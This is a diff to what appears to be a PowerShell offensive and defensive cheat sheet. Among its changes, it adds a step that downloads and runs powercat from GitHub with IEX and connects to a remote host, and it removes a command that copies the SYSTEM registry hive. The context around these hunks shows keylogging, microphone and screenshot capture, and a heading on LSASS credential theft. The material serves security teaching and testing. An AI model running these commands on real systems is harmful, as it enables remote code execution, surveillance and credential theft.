@@ -80,8 +80,8 @@ function Get-PrivateProfileString
 }
 
 # Call the function
-Get-Content 'C:\Windows\System32\GroupPolicy\gpt.ini'
-Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
+Get-Content '\\contoso\sysvol\contoso.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI'
+Get-PrivateProfileString -File '\\contoso\sysvol\contoso.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI' `
                          -Category General `
                          -Key Version
 ```
@@ -209,6 +209,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 
 # Start listener
 powercat -l -p 8000
+```
+
+```powershell
+# Load PowerCat
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 # Start client
 powercat -c 10.0.0.1 -p 8000
@@ -247,7 +252,7 @@ Write-Host ('The password is "{0}"!' -f $cred.GetNetworkCredential().Password)
 [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
 
 ```powershell
-Get-Keystrokes -LogPath keystrokes.txt -Timeout 1 -PassThru
+Get-Keystrokes -LogPath .\keystrokes.txt -CollectionInterval 1
 ```
 
 #### Audio Recording from&nbsp;Microphone
@@ -265,14 +270,6 @@ Get-MicrophoneAudio -Length 10 -Path audio.wav
 ```powershell
 Enable-WindowsOptionalFeature -FeatureName NetFx3 -Online
 Get-TimedScreenshot -Path . -Interval 10 -EndTime 14:00
-```
-
-#### Stealing Sensitive Files
-
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
-
-```powershell
-Invoke-NinjaCopy -Path c:\windows\system32\config\system -LocalDestination .\system -Verbose
 ```
 
 #### LSASS Credential Theft #1
@@ -1023,7 +1020,6 @@ Start-DscConfiguration -Path .\WindowsServerSecurityBaseline -Wait -Force -Verbo
 #### Security Baseline Tooling
 
 - [BaselineManagement](https://www.powershellgallery.com/packages/BaselineManagement)
-- [Microsoft Security Compliance Manager 4.0](https://www.microsoft.com/en-us/download/details.aspx?id=53353)
 - [Microsoft Security Compliance Toolkit 1.0](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
 - [Quickstart: Convert Group Policy into DSC](https://learn.microsoft.com/en-us/powershell/dsc/quickstarts/gpo-quickstart)
 
